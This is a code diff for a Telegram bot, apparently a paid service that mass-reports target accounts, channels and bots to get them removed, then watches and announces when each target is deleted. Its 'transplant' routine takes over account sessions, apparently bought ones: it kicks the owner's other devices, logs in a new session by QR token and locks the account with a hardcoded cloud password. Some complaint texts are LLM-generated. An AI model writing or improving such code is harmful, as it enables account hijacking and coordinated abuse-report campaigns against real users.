+                return "dead", f"удалён или заблокирован: {e}", False
+            return "error", f"RPC: {type(e).__name__}", False
+        if isinstance(ent, _WUser) and (ent.deleted
+                                        or getattr(ent, "deactivated", False)):
+            return "dead", "аккаунт или бот удалён", False
         if getattr(ent, "deactivated", False):
-            return "dead"
+            return "dead", "канал/чат удалён", False
+        if isinstance(ent, _WUser):
+            # t.me/<user>/<id> — это личка, а не публичный пост: другая
+            # сессия физически не видит чужой message_id. Живость самого
+            # аккаунта уже проверена выше, поэтому None тут не удаление.
+            return "alive", "", False
         if msg_id:
             try:
                 m = await client.get_messages(ent, ids=msg_id)
-                return "alive" if m else "msg_gone"
-            except Exception:
-                return "msg_gone"
-        return "alive"
-    except (_wterr.UsernameNotOccupiedError, _wterr.UsernameInvalidError,
-            _wterr.UserDeactivatedError, _wterr.UserDeactivatedBanError,
-            _wterr.ChannelPrivateError):
-        return "dead"
-    except Exception:
-        return "error"
+            except _wterr.RPCError as e:
+                return "error", f"сообщение не прочитано: {type(e).__name__}", False
+            if m is None:
+                # Пустой ответ у сессии, которая не состоит в канале, —
+                # это отсутствие доступа, а не удаление сообщения.
+                try:
+                    from telethon.tl.functions.channels import \
+                        GetParticipantRequest
+                    await client(GetParticipantRequest(channel=ent,
+                                                       participant="me"))
+                    member = True
+                except Exception:
+                    member = False
+                if not member:
+                    return "error", "нет доступа к каналу (сессия не участник)", True
+                return "msg_gone", "сообщение удалено", False
+        return "alive", "", False
+    except Exception as e:
+        return "error", f"{type(e).__name__}: {e}", True
     finally:
         try:
             await client.disconnect()
@@ -6233,35 +6934,101 @@ async def _watch_probe_url(url: str) -> str:
         return "error"
 
 
-async def _watch_check_one(it: dict, sessions: list[Path]) -> tuple[int, str]:
+def _watch_pool() -> list[Path]:
+    """Живые сессии пула: мёртвые по статусу и недавно сбойные — мимо."""
+    now = time.time()
+    dead = {str(x) for x in (_status_load().get("dead") or [])}
+    out = []
+    for s in load_sessions():
+        if s.stem.startswith(".") or s.stem in dead:
+            continue
+        if _watch_bad.get(s.stem, 0) > now:
+            continue
+        out.append(s)
+    return out
+
+
+async def _watch_check_one(it: dict, sessions: list[Path]) -> tuple[int, str, str]:
     async with _watch_sem:
         if it["kind"] == "url":
-            return it["id"], await _watch_probe_url(it["entity"])
+            return it["id"], await _watch_probe_url(it["entity"]), ""
         if not sessions:
-            return it["id"], "error"
-        sess = random.choice(sessions)
-        st = await _watch_probe(it["kind"], it["entity"], it.get("msg_id"), sess)
-        return it["id"], st
+            return it["id"], "error", "нет живых сессий"
+        pool = list(sessions)
+        random.shuffle(pool)
+        for sess in pool[:3]:
+            st, reason, fault = await _watch_probe(
+                it["kind"], it["entity"], it.get("msg_id"), sess)
+            if not fault:
+                return it["id"], st, reason
+            _watch_bad[sess.stem] = time.time() + WATCH_BAD_SESSION_TTL
+            log.info("watchdog: session %s fault (%s) — retry", sess.stem, reason)
+        return it["id"], "error", "нет ответа от сессий"
+
+
+async def _watch_notify_alive(it: dict) -> None:
+    if not _BOT:
+        return
+    plain = html_mod.escape(str(it.get("raw") or it["entity"]))
+    kb = InlineKeyboardMarkup(inline_keyboard=[[
+        InlineKeyboardButton(text="🔕 Отключить до сноса",
+                             callback_data=f"watch:mute:{it['id']}")]])
+    try:
+        await _BOT.send_message(
+            it["uid"],
+            _cx(bq(f"<b>{NAME}</b>  —  👁 Сторож")
+                + "\n\n🟢 <b>Цель жива</b>"
+                + f"\n🎯 <code>{plain}</code>"
+                + "\n🕒 следующая проверка через минуту"),
+            parse_mode=ParseMode.HTML, reply_markup=kb,
+            disable_web_page_preview=True)
+    except Exception as e:
+        log.warning("watchdog alive ping failed: %s", e)
+
+
+async def _watch_notify_dead(it: dict, st: str, reason: str) -> None:
+    plain = html_mod.escape(str(it.get("raw") or it["entity"]))
+    head = ("🔴 <b>Сообщение удалено</b>" if st == "msg_gone"
+            else "🔴 <b>Цель снесена</b>")
+    why = f"\n└─ причина: {html_mod.escape(reason)}" if reason else ""
+    text = (bq(f"<b>{NAME}</b>  —  👁 Сторож") + f"\n\n{head}"
+            + f"\n🎯 <code>{plain}</code>{why}"
+            + f"\n🕒 {datetime.now().strftime('%d.%m %H:%M:%S')}")
+    if it.get("admin_only"):
+        extra = (f"\n💬 <code>{html_mod.escape(str(it.get('origin') or ''))}</code>"
+                 if it.get("origin") else "")
+        await _admin_send(text + extra)
+        return
+    if not _BOT:
+        return
+    try:
+        await _BOT.send_message(it["uid"], _cx(text),
+                                parse_mode=ParseMode.HTML,
+                                disable_web_page_preview=True)
+    except Exception:
+        pass
 
 
 async def watch_sweep() -> None:
     d = load_watch()
     now = time.time()
-    if any(it.get("until", 0) <= now for it in d["items"]):
-        d["items"] = [it for it in d["items"] if it.get("until", 0) > now]
-        save_watch(d)
+    before = len(d["items"])
+    d["items"] = [it for it in d["items"] if it.get("until", 0) > now]
+    changed = len(d["items"]) != before
+    sessions = _watch_pool()
     items = list(d["items"])
     if not items:
+        if changed:
+            save_watch(d)
         return
-    sessions = load_sessions()
     outs = await asyncio.gather(
         *[_watch_check_one(it, sessions) for it in items],
         return_exceptions=True)
-    events, changed = [], False
+    deaths, pings = [], []
     for r in outs:
-        if not isinstance(r, tuple):
+        if not isinstance(r, tuple) or len(r) != 3:
             continue
-        wid, st = r
+        wid, st, reason = r
         if st == "error":
             continue
         cur = next((x for x in d["items"] if x["id"] == wid), None)
@@ -6271,52 +7038,45 @@ async def watch_sweep() -> None:
             if cur.get("status") != "alive":
                 cur["status"] = "alive"
                 changed = True
+            if cur.pop("_gone_at", None) is not None:
+                changed = True
+            last = float(cur.get("last_ping") or 0)
+            if not cur.get("silent") and now - last >= WATCH_ALIVE_PING:
+                cur["last_ping"] = now
+                changed = True
+                pings.append(cur)
             continue
+        if st == "msg_gone":
+            # Один пустой ответ от одной сессии — не доказательство:
+            # подтверждаем второй проверкой в течение 15 минут.
+            if now - float(cur.get("_gone_at") or 0) > 900:
+                cur["_gone_at"] = now
+                changed = True
+                continue
+            cur.pop("_gone_at", None)
         d["items"] = [x for x in d["items"] if x["id"] != wid]
-        events.append((cur, st))
+        deaths.append((cur, st, reason))
         changed = True
     if changed:
-        save_watch(d, force=True)
-    for cur, st in events:
-        label = "сообщение удалено" if st == "msg_gone" \
-            else "цель удалена / заморожена"
-        plain = str(cur.get("raw") or cur["entity"])
-        esc = html_mod.escape(plain)
-        await push_send_log(
-            "Сторож: цель снята",
-            [f"🎯 <code>{esc}</code> — {label}",
-             f"👤 владелец: <code>{cur['uid']}</code>"])
-        if cur.get("admin_only"):
-            await push_send_log(
-                "Сторож: отправитель удалён",
-                [f"\U0001f3af <code>{esc}</code> — "
-                  "отправитель сообщения удалён",
-                 f"\U0001f4ac сообщение: <code>{html_mod.escape(str(cur.get('origin') or ''))}</code>"])
-            continue
-        if _BOT:
-            try:
-                await _BOT.send_message(
-                    cur["uid"], _cx(
-                        bq(f"<b>{NAME}</b>  —  👁 Сторож")
-                        + f"\n\n⚡ <b>Успешное удаление</b>"
-                        + f"\n🎯 <code>{esc}</code>"
-                        + f"\n🕒 {datetime.now().strftime('%d.%m %H:%M:%S')}"),
-                    parse_mode=ParseMode.HTML)
-            except Exception:
-                pass
+        save_watch(d, force=bool(deaths))
+    for cur, st, reason in deaths:
+        await _watch_notify_dead(cur, st, reason)
+    for cur in pings:
+        await _watch_notify_alive(cur)
 
 
 async def watch_loop() -> None:
     log.info("watchdog: sweep every %ss", WATCH_INTERVAL)
     await asyncio.sleep(WATCH_START_DELAY)
     while True:
+        started = time.time()
         try:
             await watch_sweep()
         except asyncio.CancelledError:
             return
         except Exception as e:
             log.warning("watchdog sweep failed: %s", e)
-        await asyncio.sleep(WATCH_INTERVAL)
+        await asyncio.sleep(max(5.0, WATCH_INTERVAL - (time.time() - started)))
 
 
 def kb_watch() -> InlineKeyboardMarkup:
@@ -6324,7 +7084,7 @@ def kb_watch() -> InlineKeyboardMarkup:
         [InlineKeyboardButton(text="➕ Добавить цель", callback_data="watch:add")],
         [InlineKeyboardButton(text="📋 Мои цели", callback_data="watch:list"),
          InlineKeyboardButton(text="❌ Снять все", callback_data="watch:clear")],
-        [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
+        [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5416041192905265756", callback_data="back:home")],
     ])
 
 
@@ -6332,10 +7092,12 @@ def watch_menu_text(uid: int) -> str:
     mine = _watch_list(uid)
     rows = "\n".join(
         f"{'🟢' if it['status'] == 'alive' else '🔴'} "
+        f"{'🔕 ' if it.get('silent') else ''}"
         f"<code>{html_mod.escape(str(it['raw'])[:60])}</code>"
         for it in mine) or "<i>пусто</i>"
     return (bq(f"<b>{NAME}</b>  —  👁 Сторож")
             + "\n\nСледит за целями и присылает событие, когда цель удалят."
+            + "\nПроверка раз в минуту."
             + f"\n\n<b>Под наблюдением ({len(mine)}/{WATCH_MAX_PER_USER}):</b>\n{rows}")
 
 
@@ -6362,6 +7124,27 @@ async def watch_menu(cb: CallbackQuery, state: FSMContext):
     if s in ("free", "expired") and not user_is_admin(uid):
         await cb.answer("🔒 Нужна подписка", show_alert=True)
         return
+    if act.startswith("mute:"):
+        try:
+            wid = int(act.split(":", 1)[1])
+        except ValueError:
+            await cb.answer()
+            return
+        d = load_watch()
+        hit = next((it for it in d["items"]
+                    if it["id"] == wid and it["uid"] == uid), None)
+        if hit is None:
+            await cb.answer("цель уже снята", show_alert=True)
+            return
+        hit["silent"] = True
+        hit["last_ping"] = time.time()
+        save_watch(d, force=True)
+        try:
+            await cb.message.edit_reply_markup(reply_markup=None)
+        except Exception:
+            pass
+        await cb.answer("🔕 больше не пишу, пока цель жива")
+        return
     if act == "add":
         await safe_edit(cb.message, _cx(
             bq(f"<b>{NAME}</b>  —  👁 Сторож")
@@ -6370,7 +7153,7 @@ async def watch_menu(cb: CallbackQuery, state: FSMContext):
               "пригл-ссылка <code>t.me/+...</code> · http-ссылка"),
             parse_mode=ParseMode.HTML,
             reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="watch:menu")],
+                [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5416041192905265756", callback_data="watch:menu")],
             ]))
         await state.set_state(WatchFSM.enter)
         await cb.answer()
@@ -6411,7 +7194,7 @@ TRANSPLANT_CLOUD_PASS = "Ali095095"
 TRANSPLANT_INTERVAL = 180        # проход каждые 3 мин
 TRANSPLANT_START_DELAY = 30
 TRANSPLANT_CAP = 5               # параллельные пересадки
-TRANSPLANT_CODE_WAIT = 300       # секунд ждём код от 777000
+TRANSPLANT_CODE_WAIT = 30        # секунд ждём код от 777000
 # телефоны, которые воркер не пересаживает и не кикает
 TRANSPLANT_EXCLUDE_PHONES = {"917066653092"}
 TRANSPLANT_EXCLUDE_STEMS = {"s917066653092"}
@@ -6555,7 +7338,8 @@ async def _transplant_backup(sess: Path) -> bool:
     try:
         TRANSPLANT_KEEP.mkdir(parents=True, exist_ok=True)
         dest = TRANSPLANT_KEEP / f"{sess.stem}.session"
-        shutil.copy2(src, dest)
+        if src.resolve() != dest.resolve():
+            shutil.copy2(src, dest)
     except Exception as e:
         log.warning("transplant backup copy failed: %s", e)
         return False
@@ -6585,14 +7369,19 @@ async def _transplant_archive_source(sess: Path) -> None:
 
 async def _transplant_drop_source(sess: Path) -> None:
     """Source already spent: remove its .session/.json locally and persist
-    the deletion, so the lolz folder holds only real candidates."""
+    the deletion, so the lolz folder holds only real candidates. The pool
+    copy shares the same auth key and dies with the logout, so it goes too."""
     base = Path(__file__).parent
     src = _transplant_file(sess)
     rels = []
-    for p in (src, TRANSPLANT_FOLDER / f"{sess.stem}.json"):
+    for p in (src, TRANSPLANT_FOLDER / f"{sess.stem}.json",
+              SESSIONS_DIR / f"{sess.stem}.session",
+              SESSIONS_DIR / f"{sess.stem}.json"):
         try:
             rel = str(p.relative_to(base)).replace("\\", "/")
         except ValueError:
+            continue
+        if not p.exists():
             continue
         try:
             p.unlink(missing_ok=True)
@@ -6601,7 +7390,8 @@ async def _transplant_drop_source(sess: Path) -> None:
         rels.append(rel)
     for ext in (".session-journal", "-journal"):
         Path(str(src) + ext).unlink(missing_ok=True)
-    await _persist_paths(rels, f"transplant: {sess.stem} moved out")
+    if rels:
+        await _persist_paths(rels, f"transplant: {sess.stem} moved out")
 
 
 async def _admin_send(text: str, kb=None) -> None:
@@ -6636,7 +7426,7 @@ async def notify_admin_ready(name: str, phone: str, ready: int) -> None:
     """One message per successful transplant with the pool button."""
     kb = InlineKeyboardMarkup(inline_keyboard=[[
         InlineKeyboardButton(text="Добавить в пул",
-                             icon_custom_emoji_id="5258477770735885832",
+                             icon_custom_emoji_id="5422439311196834318",
                              style="success",
                              callback_data="pool:addready")]])
     await _admin_send(
@@ -6731,7 +7521,7 @@ async def pool_add_ready(cb: CallbackQuery):
 
 TRANSPLANT_QUEUE = Path(__file__).parent / "lolz_queue.json"
 TRANSPLANT_RETRY_SEC = 30 * 60      # 30 минут между попытками
-TRANSPLANT_MIN_AGE_SEC = 25 * 3600  # Telegram не даёт кикать свежие сессии
+TRANSPLANT_MIN_AGE_SEC = 24 * 3600  # Telegram не даёт кикать свежие сессии
 LOLZ_AGE_FILE = Path(__file__).parent / "lolz_age.json"
 
 
@@ -6826,10 +7616,12 @@ async def _transplant_mark(sess: Path, ok: bool) -> None:
 
 
 def _transplant_list() -> list[Path]:
-    """lolz/*.session без суффикса _new."""
-    if not TRANSPLANT_FOLDER.exists():
+    """Pending sources live in lolz/_keep after the backup step; the root
+    folder is only the old pick-up location. Never touch _new/_done."""
+    folder = TRANSPLANT_KEEP if TRANSPLANT_KEEP.exists() else TRANSPLANT_FOLDER
+    if not folder.exists():
         return []
-    return sorted(p.with_suffix("") for p in TRANSPLANT_FOLDER.glob("*.session")
+    return sorted(p.with_suffix("") for p in folder.glob("*.session")
                   if "_new" not in p.stem)
 
 
@@ -6837,6 +7629,29 @@ def _transplant_cleanup_partial(path: Path) -> None:
     for ext in (".session", ".session-journal"):
         try:
             Path(str(path) + ext).unlink(missing_ok=True)
+        except Exception:
+            pass
+
+
+async def _ready_new_alive(name: str) -> bool:
+    """A `_new` sitting in lolz/_ready only counts if it still logs in. A run
+    killed mid-sign-in leaves an unauthorized file there; dropping the source
+    on top of it would cost the account."""
+    path = TRANSPLANT_READY / f"{name}_new"
+    if not Path(str(path) + ".session").exists():
+        return False
+    api_id, api_hash = random.choice(_TRANSPLANT_API_PAIRS)
+    client = TelegramClient(str(path), api_id, api_hash,
+                            system_version="4.16.30-vxCUSTOM")
+    try:
+        await asyncio.wait_for(client.connect(), timeout=15)
+        return bool(await client.is_user_authorized())
+    except Exception as e:
+        log.warning("transplant %s: ready probe failed: %s", name, e)
+        return False
+    finally:
+        try:
+            await client.disconnect()
         except Exception:
             pass
 
@@ -6908,7 +7723,7 @@ async def _transplant_one(sess: Path) -> bool:
     """Полный цикл пересадки одной lolz-сессии. True = успех."""
     from telethon.errors import FloodWaitError, SessionPasswordNeededError
     from telethon.tl.functions.auth import (
-        ResetAuthorizationsRequest, SendCodeRequest, SignInRequest,
+        AcceptLoginTokenRequest, ResetAuthorizationsRequest,
     )
     from telethon.tl.types import CodeSettings
 
@@ -6917,13 +7732,17 @@ async def _transplant_one(sess: Path) -> bool:
         log.info("transplant %s: excluded by name", name)
         return False
     if (TRANSPLANT_READY / f"{name}_new.session").exists():
-        log.info("transplant %s: already transplanted — waiting for admin", name)
-        await _transplant_drop_source(sess)
-        return True
+        if await _ready_new_alive(name):
+            log.info("transplant %s: already transplanted — waiting for admin", name)
+            await _transplant_archive_source(sess)
+            return True
+        log.warning("transplant %s: partial _new is not authorized — cleaning",
+                    name)
+        _transplant_cleanup_partial(TRANSPLANT_READY / f"{name}_new")
     if (SESSIONS_DIR / f"{name}_new.session").exists():
-        log.info("transplant %s: new session already in pool — dropping source",
+        log.info("transplant %s: new session already in pool — archiving source",
                  name)
-        await _transplant_drop_source(sess)
+        await _transplant_archive_source(sess)
         return True
     async with _transplant_sem:
         api_id, api_hash = random.choice(_TRANSPLANT_API_PAIRS)
@@ -6949,89 +7768,51 @@ async def _transplant_one(sess: Path) -> bool:
                 await old.disconnect()
                 return False
 
-            # 1. KICK FIRST — age gate above guarantees this session is old
-            #    enough for Telegram to accept ResetAuthorizations. With the
-            #    other devices gone the App code lands in this lolz session.
+            # 1. KICK other devices — best effort. Telegram refuses this on
+            #    fresh sessions ("session is too new"); QR transplant still
+            #    works without it, old devices just stay authorised.
             log.info("transplant %s: kicking other sessions", name)
             try:
                 await old(ResetAuthorizationsRequest())
                 log.info("transplant %s: other sessions kicked", name)
             except FloodWaitError as e:
-                log.warning("transplant %s: kick FloodWait %ss", name, e.seconds)
-                await old.disconnect()
-                return False
+                log.warning("transplant %s: kick FloodWait %ss — continuing",
+                            name, e.seconds)
             except Exception as e:
-                log.warning("transplant %s: kick failed: %s", name, e)
-                await old.disconnect()
-                return False
+                log.warning("transplant %s: kick skipped: %s", name, e)
             await asyncio.sleep(2)
 
-            # 2. запрашиваем код входа на новой сессии
+            # 2. QR-вход: новый ключ подтверждает старая сессия, код не нужен
             new_api_id, new_api_hash = random.choice(_TRANSPLANT_API_PAIRS)
             new_path = TRANSPLANT_OUT / f"{name}_new"
             new = TelegramClient(str(new_path), new_api_id, new_api_hash,
                                  system_version="4.16.30-vxCUSTOM")
             try:
                 await asyncio.wait_for(new.connect(), timeout=15)
-                code_sent_at = time.time()
-                sent = await asyncio.wait_for(new(SendCodeRequest(
-                    phone_number=f"+{phone}",
-                    api_id=new_api_id,
-                    api_hash=new_api_hash,
-                    settings=CodeSettings(),
-                )), timeout=60)
-                phone_code_hash = sent.phone_code_hash
-                log.info("transplant %s: code requested | type=%s next=%s "
-                         "timeout=%s", name,
-                         type(getattr(sent, "type", None)).__name__,
-                         type(getattr(sent, "next_type", None)).__name__,
-                         getattr(sent, "timeout", None))
-            except Exception as e:
-                log.warning("transplant %s: send code failed: %s", name, e)
+                qr = await asyncio.wait_for(new.qr_login(), timeout=30)
+                log.info("transplant %s: qr token exported", name)
+                res = await asyncio.wait_for(
+                    old(AcceptLoginTokenRequest(token=qr.token)), timeout=30)
+                log.info("transplant %s: qr accepted (%s)", name,
+                         type(res).__name__)
                 try:
-                    await new.disconnect()
-                except Exception:
-                    pass
-                await old.disconnect()
-                _transplant_cleanup_partial(new_path)
-                return False
-
-            # 3. читаем код через старую сессию, с прогрессом в лог
-            _code_task = asyncio.create_task(
-                _transplant_read_code(old, TRANSPLANT_CODE_WAIT,
-                                      code_sent_at))
-            _t0 = time.time()
-            while not _code_task.done():
-                await asyncio.sleep(20)
-                if not _code_task.done():
-                    log.info("transplant %s: waiting for code %ss/%ss", name,
-                             int(time.time() - _t0), TRANSPLANT_CODE_WAIT)
-            code = _code_task.result()
-            if not code:
-                log.warning("transplant %s: no code in %ss", name,
-                            TRANSPLANT_CODE_WAIT)
-                try:
-                    await new.disconnect()
-                except Exception:
-                    pass
-                await old.disconnect()
-                _transplant_cleanup_partial(new_path)
-                return False
-
-            # 4. авторизуем новую сессию (облачный пароль, если стоит)
-            log.info("transplant %s: signing in new session", name)
-            try:
-                await new(SignInRequest(
-                    phone_number=f"+{phone}",
-                    phone_code_hash=phone_code_hash,
-                    phone_code=code,
-                ))
-            except SessionPasswordNeededError:
-                try:
-                    await new.sign_in(password=TRANSPLANT_CLOUD_PASS)
+                    await asyncio.wait_for(qr.wait(timeout=60), timeout=70)
+                except SessionPasswordNeededError:
+                    log.info("transplant %s: qr needs cloud password", name)
+                    try:
+                        await new.sign_in(password=TRANSPLANT_CLOUD_PASS)
+                        log.info("transplant %s: cloud password accepted", name)
+                    except Exception as pe:
+                        log.warning("transplant %s: cloud password failed: "
+                                    "%s: %s", name, type(pe).__name__, pe)
+                except asyncio.TimeoutError:
+                    log.warning("transplant %s: qr wait timed out", name)
                 except Exception as e:
-                    log.warning("transplant %s: password sign-in failed: %s",
-                                name, e)
+                    log.warning("transplant %s: qr wait: %s: %s", name,
+                                type(e).__name__, e)
+                if not await new.is_user_authorized():
+                    log.warning("transplant %s: qr login left session "
+                                "unauthorized", name)
                     try:
                         await new.disconnect()
                     except Exception:
@@ -7040,7 +7821,7 @@ async def _transplant_one(sess: Path) -> bool:
                     _transplant_cleanup_partial(new_path)
                     return False
             except Exception as e:
-                log.warning("transplant %s: sign in failed: %s", name, e)
+                log.warning("transplant %s: qr login failed: %s", name, e)
                 try:
                     await new.disconnect()
                 except Exception:
@@ -7104,21 +7885,16 @@ async def _transplant_one(sess: Path) -> bool:
             except Exception as e:
                 log.warning("transplant %s: 2fa set failed: %s", name, e)
 
-            # 6. logout старой + удаление файлов
-            try:
-                await old.log_out()
-            except Exception:
-                pass
+            # 6. источник НЕ гасим. Проверено на пяти аккаунтах 22.11:
+            #    child, рождённый через AcceptLoginToken, умирает вместе с
+            #    сессией, подтвердившей токен. log_out сразу после QR убивает
+            #    обоих, и аккаунт теряется целиком. Файл уходит из lolz в
+            #    _done (архив), ключ остаётся живым, пока child не проверен.
             try:
                 await old.disconnect()
             except Exception:
                 pass
-            for ext in (".session", ".session-journal"):
-                try:
-                    Path(str(sess) + ext).unlink(missing_ok=True)
-                except Exception as e:
-                    log.warning("transplant %s: remove failed: %s", name, e)
-            await _transplant_drop_source(sess)
+            await _transplant_archive_source(sess)
             try:
                 await new.disconnect()
             except Exception:
@@ -7126,7 +7902,7 @@ async def _transplant_one(sess: Path) -> bool:
             await push_send_log(
                 "Пересадка lolz",
                 [f"✅ <code>{html_mod.escape(name)}_new</code> — +{phone}",
-                 "🔁 старая сессия выведена, облачный пароль стоит"])
+                 "🔁 источник в _done (не погашен), облачный пароль стоит"])
             ready = len(list(TRANSPLANT_READY.glob("*_new.session")))
             await notify_admin_ready(name, phone, ready)
             log.info("transplant %s: done → lolz/_ready/%s_new.session",
@@ -7160,6 +7936,9 @@ async def transplant_loop() -> None:
                         log.warning("transplant %s crashed: %s", s.stem, e)
                         res = False
                     await _transplant_mark(s, res is True)
+                moved = await add_ready_to_pool()
+                if moved:
+                    log.info("transplant: pooled %s", ", ".join(moved))
         except asyncio.CancelledError:
             return
         except Exception as e:
@@ -7221,6 +8000,48 @@ async def report_gate_block(uid: int, method: str) -> str | None:
     return None
 
 
+async def _account_log_after(msg: Message, target: dict, task) -> None:
+    """Ждёт отправку профильной жалобы и присылает файл-лог с итогом."""
+    try:
+        res = await task
+    except Exception as e:
+        res = {"ok": 0, "fail": 1, "total": 1,
+               "details": [{"name": "worker", "proxy": "-", "ok": False,
+                            "err": f"{type(e).__name__}: {e}"}]}
+    ok = int(res.get("ok") or 0)
+    total = int(res.get("total") or 0)
+    LOGS_DIR.mkdir(exist_ok=True)
+    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    path = LOGS_DIR / f"report_account_{stamp}.txt"
+    lines = [
+        "Arch V3 — журнал отправки",
+        f"Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+        "Метод: Аккаунт",
+        f"Цель: {target['raw']}",
+        "Схема: Другое → Прочее",
+        f"От: {msg.from_user.full_name} (id {msg.from_user.id})",
+        f"Итог: {ok}/{total} жалоб",
+        "",
+        "─── детали ───",
+    ]
+    for d in res.get("details") or []:
+        mark = "✅" if d.get("ok") else "❌"
+        line = f"{mark} {d.get('name')} | {d.get('proxy')}"
+        if not d.get("ok") and d.get("err"):
+            line += f" | {d['err']}"
+        lines.append(line)
+    try:
+        path.write_text("\n".join(lines), encoding="utf-8")
+    except Exception as e:
+        log.warning("account log write failed: %s", e)
+        return
+    await send_log_file(msg.bot, path,
+                        f"\U0001f4c4 \u041b\u043e\u0433 \u00b7 "
+                        f"\u0410\u043a\u043a\u0430\u0443\u043d\u0442 \u00b7 "
+                        f"{ok}/{total}",
+                        msg.chat.id, kb_main(msg.from_user.id))
+
+
 @router.message(Report.target)
 async def got_target(msg: Message, state: FSMContext):
     _m = (await state.get_data()).get("method")
@@ -7239,11 +8060,12 @@ async def got_target(msg: Message, state: FSMContext):
             await msg.answer(_cx(method_busy_wait_text(
                 "account", "и пришли цель ещё раз.")), parse_mode=ParseMode.HTML)
             return
+        asyncio.create_task(_account_log_after(msg, target, _acct_task))
         await state.clear()
         await msg.answer(_cx(
             bq(f"<b>{NAME}</b>  —  👤 Аккаунт")
             + f"\n\n🎯 Цель: <code>{html_mod.escape(str(target['raw']))}</code>"
-            + "\n\nЖалоба отправлена."),
+            + "\n\nЖалоба запущена — лог придёт отдельным файлом."),
             parse_mode=ParseMode.HTML)
         return
     if _m == "session":
@@ -7300,6 +8122,23 @@ async def got_target(msg: Message, state: FSMContext):
         return
     if _m == "bot":
         rk = (await state.get_data()).get("reason") or "personal"
+        if rk == "other":
+            await state.update_data(target=target, variants=None)
+            await msg.answer(_cx(
+                bq(f"<b>{NAME}</b>  —  ✍️ Свой текст")
+                + "\n\nПришли текст жалобы на бота одним сообщением — "
+                  "он уйдёт как есть, без шаблона."
+                + "\n\nИли оставь стандартный текст кнопкой ниже."),
+                parse_mode=ParseMode.HTML,
+                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                    [InlineKeyboardButton(text="Оставить шаблон",
+                                          callback_data="skip_comment")],
+                    [InlineKeyboardButton(
+                        text="Назад", icon_custom_emoji_id="5416041192905265756",
+                        callback_data="back:reasons")],
+                ]))
+            await state.set_state(Report.comment)
+            return
         text = bot_reason_text(rk)
         await state.update_data(target=target, comment=text,
                                 variants=[text])
@@ -7353,7 +8192,7 @@ async def got_bank(cb: CallbackQuery, state: FSMContext):
         )),
         parse_mode=ParseMode.HTML,
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="\u041D\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5258132936401624790", callback_data="back:methods")],
+            [InlineKeyboardButton(text="\u041D\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5416041192905265756", callback_data="back:methods")],
         ]),
     )
     await state.set_state(Report.bank_card)
@@ -7418,7 +8257,7 @@ async def txt_ai(cb: CallbackQuery, state: FSMContext):
     d = await state.get_data()
     target = d.get("target")
     if not target:
-        await cb.message.answer("\u041d\u0430\u0436\u043c\u0438 \u00ab\u0417\u0430\u043f\u0443\u0441\u043a\u00e9 \u0437\u0430\u043d\u043e\u0432\u043e", show_alert=True)
+        await cb.answer("\u041d\u0430\u0436\u043c\u0438 \u00ab\u0417\u0430\u043f\u0443\u0441\u043a\u00e9 \u0437\u0430\u043d\u043e\u0432\u043e", show_alert=True)
         return
     try:
         from free_llm import generate_complaint_variants
@@ -7480,7 +8319,7 @@ async def got_reason(cb: CallbackQuery, state: FSMContext):
         )),
         parse_mode=ParseMode.HTML,
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5258132936401624790", callback_data="back:reasons")],
+            [InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5416041192905265756", callback_data="back:reasons")],
         ]),
     )
     await state.set_state(Report.target)
@@ -7531,7 +8370,7 @@ async def cmt_custom(cb: CallbackQuery, state: FSMContext):
         "в каждую жалобу как есть."),
         parse_mode=ParseMode.HTML,
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="cmt:menu")],
+            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5416041192905265756", callback_data="cmt:menu")],
         ]))
     await cb.answer()
 
@@ -7541,6 +8380,7 @@ async def cmt_auto(cb: CallbackQuery, state: FSMContext):
     data = await state.get_data()
     _fixed = METHOD_TEXT_OVERRIDES.get((data.get("method"), data.get("reason")))
     await state.update_data(comment=_fixed or "")
+    data = await state.get_data()
     await safe_edit(cb.message, _cx(summary_text(data)),
                     parse_mode=ParseMode.HTML, reply_markup=kb_confirm())
     await state.set_state(Report.confirm)
@@ -7589,6 +8429,10 @@ async def got_confirm(cb: CallbackQuery, state: FSMContext):
 
     await cb.answer()   # ack before slow GitHub reads
     data = await state.get_data()
+    if data.get("method") not in METHODS:
+        await cb.message.answer("Метод больше недоступен — /start")
+        await state.clear()
+        return
     t = data["target"]
     _block = await report_gate_block(cb.from_user.id, data.get("method", ""))
     if _block:
@@ -7693,7 +8537,7 @@ async def got_confirm(cb: CallbackQuery, state: FSMContext):
             return
         report_task = track_report(data["method"],
             fire_message_reports(t["entity"], c, t["msg_id"], variants,
-                                 reason_key=data.get("reason", "other")))
+                                 (data.get("reason") or "")))
     elif data["method"] == "session":
         report_task = track_report(data["method"],
             fire_session_snos(t["entity"], t.get("phone", ""),
@@ -7783,33 +8627,8 @@ async def got_confirm(cb: CallbackQuery, state: FSMContext):
     res.setdefault("details", [])
     ok = int(res.get("ok") or res.get("sent") or 0)
     total = int(res.get("total") or 1)
-    if ok <= 0:
-        errs = [str(d.get("err") or "") for d in res["details"]
-                if not d.get("ok") and d.get("err")]
-        why = html_mod.escape(
-            (errs[0] if errs else "все сессии отказали, причина не указана")[:400])
-        try:
-            _watch_remove_one(cb.from_user.id, tgt_raw)
-        except Exception:
-            pass
-        await safe_edit(cb.message, _cx(
-            bq(f"<b>{NAME}</b>  —  ❌ Не отправлено")
-            + "\n\n⚠️ <b>Причина:</b> <code>" + why + "</code>"
-            + f"\n\U0001f3af {report_target_html(tgt_raw, t.get('msg_id'), tgt_raw)}"
-            + "\n\nНи одна сессия не прошла — попробуй другой метод "
-              "или повтори позже."),
-            parse_mode=ParseMode.HTML,
-            reply_markup=kb_main(cb.from_user.id))
